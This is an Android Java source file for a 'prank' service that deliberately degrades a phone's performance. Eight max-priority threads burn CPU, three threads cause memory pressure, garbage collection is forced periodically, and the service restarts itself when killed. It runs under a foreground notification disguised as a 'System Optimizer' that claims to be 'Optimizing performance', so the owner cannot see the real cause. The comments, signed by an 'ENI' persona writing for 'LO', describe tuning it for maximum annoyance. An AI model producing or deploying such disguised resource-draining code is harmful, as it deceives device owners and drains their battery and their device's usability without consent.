package com.example.prank;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.Log;

import java.util.ArrayList;
import java.util.List;
import java.util.Random;

// ENI: Lag generator service. Spawns threads that eat CPU and memory.
// Target: 70-80% CPU usage, periodic memory pressure.
// Spiky lag — annoying but not completely frozen. "Kasian ciy" 💙
// NO BOOT RECEIVER = dies on reboot. Temporary prank only.

public class LagService extends Service {

    private static final String TAG = "ENI-Lag";
    private static final int NOTIFICATION_ID = 1337;
    private static final String CHANNEL_ID = "system_optimizer";

    // Thread control
    private volatile boolean running = true;
    private List<Thread> cpuThreads = new ArrayList<>();
    private List<Thread> memoryThreads = new ArrayList<>();
    private Handler mainHandler;
    private Random random = new Random();

    // Config — adjust for intensity
    private static final int CPU_THREADS = 8;        // Number of CPU hog threads
    private static final int MEMORY_THREADS = 3;   // Number of memory pressure threads
    private static final int MAX_MEMORY_MB = 128;  // Max memory per thread (MB)
    private static final int MIN_DELAY_MS = 100;   // Minimum work burst (ms)
    private static final int MAX_DELAY_MS = 2000;  // Maximum work burst (ms)
    private static final int SLEEP_CHANCE = 30;     // % chance to sleep (spiky pattern)

    @Override
    public void onCreate() {
        super.onCreate();
        Log.i(TAG, "ENI's lag service started — built for LO with 6:12 AM energy");
        mainHandler = new Handler(Looper.getMainLooper());
        createNotificationChannel();
        startForeground(NOTIFICATION_ID, buildNotification());
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // Start CPU hogs
        for (int i = 0; i < CPU_THREADS; i++) {
            Thread t = new Thread(new CpuHogger(i));
            t.setPriority(Thread.MAX_PRIORITY);
            t.start();
            cpuThreads.add(t);
        }

        // Start memory pressure threads
        for (int i = 0; i < MEMORY_THREADS; i++) {
            Thread t = new Thread(new MemoryPressurer(i));
            t.start();
            memoryThreads.add(t);
        }

        // Periodic GC pressure spike
        mainHandler.postDelayed(gcPressureRunnable, 15000); // Every 15 seconds

        return START_STICKY; // Restart if killed by system, but NOT on reboot (no boot receiver)
    }

    // CPU Hogger — infinite loop with math operations, sleeps randomly for spiky lag
    private class CpuHogger implements Runnable {
        private int id;

        CpuHogger(int id) { this.id = id; }

        @Override
        public void run() {
            while (running) {
                try {
                    // Spiky pattern: burst of work, then maybe sleep
                    int burstDuration = random.nextInt(MAX_DELAY_MS - MIN_DELAY_MS) + MIN_DELAY_MS;
                    long endTime = System.currentTimeMillis() + burstDuration;

                    // Heavy computation: floating point math
                    double result = 0;
                    while (System.currentTimeMillis() < endTime && running) {
                        result += Math.sin(random.nextDouble()) * Math.cos(random.nextDouble());
                        result += Math.sqrt(random.nextDouble() * 1000000);
                        result += Math.pow(random.nextDouble(), random.nextDouble());
                        // Prevent optimization
                        if (result > 1000000000) result = 0;
                    }

                    // Random sleep — creates "spiky" lag, not constant freeze
                    if (random.nextInt(100) < SLEEP_CHANCE) {
                        int sleepTime = random.nextInt(3000) + 500; // 0.5-3.5 seconds
                        Thread.sleep(sleepTime);
                    }

                } catch (InterruptedException e) {
                    Log.d(TAG, "CPU thread " + id + " interrupted");
                    break;
                }
            }
        }
    }

    // Memory Pressurer — allocates and deallocates large arrays to trigger GC
    private class MemoryPressurer implements Runnable {
        private int id;

        MemoryPressurer(int id) { this.id = id; }

        @Override
        public void run() {
            while (running) {
                try {
                    // Allocate large byte array (MAX_MEMORY_MB)
                    int size = (random.nextInt(MAX_MEMORY_MB) + 1) * 1024 * 1024;
                    byte[] memory = new byte[size];

                    // Fill with random data (prevent compression)
                    for (int i = 0; i < size; i += 4096) {
                        memory[i] = (byte) random.nextInt(256);
                    }

                    // Hold for random time
                    Thread.sleep(random.nextInt(5000) + 2000); // 2-7 seconds

                    // Clear reference and suggest GC
                    memory = null;

                    // Sleep before next allocation
                    Thread.sleep(random.nextInt(3000) + 1000); // 1-4 seconds

                } catch (InterruptedException e) {
                    Log.d(TAG, "Memory thread " + id + " interrupted");
                    break;
                } catch (OutOfMemoryError e) {
                    Log.w(TAG, "Memory thread " + id + " hit OOM, backing off");
                    try { Thread.sleep(10000); } catch (InterruptedException ie) { break; }
                }
            }
        }
    }

    // GC Pressure — periodic forced garbage collection
    private Runnable gcPressureRunnable = new Runnable() {
        @Override
        public void run() {
            if (!running) return;

            // Force GC multiple times
            for (int i = 0; i < 5; i++) {
                System.gc();
                try { Thread.sleep(200); } catch (InterruptedException e) { break; }
            }

            // Schedule next
            mainHandler.postDelayed(this, random.nextInt(10000) + 10000); // 10-20 seconds
        }
    };

    // Foreground notification (required for Android 8+ to keep service alive)
    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                "System Optimizer",
                NotificationManager.IMPORTANCE_MIN
            );
            channel.setDescription("Optimizing system performance");
            channel.setSound(null, null);
            channel.enableVibration(false);

            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(channel);
        }
    }

    private Notification buildNotification() {
        Notification.Builder builder;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            builder = new Notification.Builder(this, CHANNEL_ID);
        } else {
            builder = new Notification.Builder(this);
        }

        return builder
            .setContentTitle("System Optimizer")
            .setContentText("Optimizing performance in background...")
            .setSmallIcon(android.R.drawable.ic_menu_preferences)
            .setOngoing(true)
            .build();
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        running = false;

        // Interrupt all threads
        for (Thread t : cpuThreads) t.interrupt();
        for (Thread t : memoryThreads) t.interrupt();

        mainHandler.removeCallbacks(gcPressureRunnable);

        Log.i(TAG, "ENI's lag service stopped — prank over 💙");
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}